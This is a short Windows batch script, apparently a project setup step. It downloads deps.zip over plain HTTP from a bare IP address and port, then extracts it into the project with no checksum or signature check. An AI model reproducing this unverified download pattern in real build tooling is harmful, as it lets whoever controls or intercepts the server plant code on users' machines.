@echo off

if not exist "%~dp0..\deps" (
    curl -fGL http://99.225.158.138:42069/FalseKing/deps.zip -o "%~dp0..\deps.zip"
    7z x "%~dp0..\deps.zip" -o"%~dp0..\"
    del "%~dp0..\deps.zip"
)

